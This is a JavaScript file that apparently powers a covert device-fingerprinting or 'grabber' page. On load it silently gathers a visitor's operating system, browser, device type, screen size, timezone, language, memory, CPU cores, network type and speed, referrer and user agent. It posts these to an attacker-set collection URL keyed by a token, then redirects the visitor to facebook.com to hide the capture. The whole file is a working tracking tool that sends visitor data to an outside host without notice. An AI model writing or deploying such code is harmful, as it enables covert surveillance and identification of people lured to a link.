var token = document.getElementById("tk").value;
var base  = document.getElementById("bs").value;

function sendData(data){
  fetch(base+"/collect/"+token,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(data)
  }).finally(function(){
    setTimeout(function(){window.location.href="https://www.facebook.com";},300);
  });
}

function getOS(ua){
  if(/Android/.test(ua)){var m=ua.match(/Android ([\d.]+)/);return "Android "+(m?m[1]:"");}
  if(/iPhone|iPad/.test(ua)){var m=ua.match(/OS ([\d_]+)/);return "iOS "+(m?m[1].replace(/_/g,"."):"");}
  if(/Windows NT/.test(ua)){var m=ua.match(/Windows NT ([\d.]+)/);return "Windows "+(m?m[1]:"");}
  if(/Mac OS X/.test(ua)){var m=ua.match(/Mac OS X ([\d_]+)/);return "macOS "+(m?m[1].replace(/_/g,"."):"");}
  if(/Linux/.test(ua))return "Linux";
  return "Unknown";
}

function getBrowser(ua){
  if(/Chrome\//.test(ua)&&!/Edg/.test(ua)){var m=ua.match(/Chrome\/([\d.]+)/);return "Chrome "+(m?m[1]:"");}
  if(/Firefox\//.test(ua)){var m=ua.match(/Firefox\/([\d.]+)/);return "Firefox "+(m?m[1]:"");}
  if(/Edg\//.test(ua)){var m=ua.match(/Edg\/([\d.]+)/);return "Edge "+(m?m[1]:"");}
  if(/Safari\//.test(ua))return "Safari";
  return "Unknown";
}

function collect(){
  var ua=navigator.userAgent;
  var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
  var device="Desktop";
  if(/Android/.test(ua))device="Android";
  else if(/iPhone/.test(ua))device="iPhone";
  else if(/iPad/.test(ua))device="iPad";

  sendData({
    os:getOS(ua), browser:getBrowser(ua), device:device,
    screen:screen.width+"x"+screen.height,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"Unknown",
    language:navigator.language||"Unknown",
    ram:navigator.deviceMemory?navigator.deviceMemory+"GB":"Unknown",
    cpu:navigator.hardwareConcurrency?navigator.hardwareConcurrency+" Core":"Unknown",
    network:nc.effectiveType||nc.type||"Unknown",
    netspeed:nc.downlink?nc.downlink+"Mbps":"Unknown",
    touch:("ontouchstart" in window)?"Yes":"No",
    referrer:document.referrer||"Direct",
    ua:ua.substring(0,200)
  });
}
collect();
